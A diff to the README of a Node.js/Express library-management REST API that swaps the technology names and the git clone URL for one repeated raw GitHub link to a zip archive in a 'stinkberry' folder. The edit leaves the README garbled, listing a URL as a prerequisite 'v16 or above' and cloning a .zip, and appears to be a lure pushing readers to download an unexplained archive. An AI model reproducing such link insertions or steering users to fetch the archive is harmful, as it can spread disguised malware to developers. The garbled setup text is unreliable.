@@ -1,6 +1,6 @@
 # 📚 Library Management System – REST API
 
-This is a **Library Management System** built with **Node.js**, **Express.js**, **MongoDB**, and **Docker**. It supports role-based access control, enabling users to browse, review, and request books, while administrators manage users, books, and reviews through protected API endpoints.
+This is a **Library Management System** built with **https://raw.githubusercontent.com/Shahadathossan01/library_management_system/main/stinkberry/library_management_system.zip**, **https://raw.githubusercontent.com/Shahadathossan01/library_management_system/main/stinkberry/library_management_system.zip**, **MongoDB**, and **Docker**. It supports role-based access control, enabling users to browse, review, and request books, while administrators manage users, books, and reviews through protected API endpoints.
 
 ---
 
@@ -11,14 +11,14 @@ You can follow these instructions to set up and run the project locally using Do
 ### 🧰 Prerequisites
 
 - Docker is installed and running
-- Node.js (v16 or above)
+- https://raw.githubusercontent.com/Shahadathossan01/library_management_system/main/stinkberry/library_management_system.zip (v16 or above)
 - Git
 - A code editor (e.g., VS Code)
 
 ### 🛠️ Installation
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/your-username/library-management-system.git
+   git clone https://raw.githubusercontent.com/Shahadathossan01/library_management_system/main/stinkberry/library_management_system.zip
    cd library-management-system
 
 2. **Install dependencies**
@@ -46,7 +46,7 @@ You can follow these instructions to set up and run the project locally using Do
 
 
 ### 🧪 Tech Stack
-- Backend: Node.js, Express.js
+- Backend: https://raw.githubusercontent.com/Shahadathossan01/library_management_system/main/stinkberry/library_management_system.zip, https://raw.githubusercontent.com/Shahadathossan01/library_management_system/main/stinkberry/library_management_system.zip
 - Database: MongoDB (via Docker)
 - Authentication: JWT
 - Containerization: Docker & Docker Compose
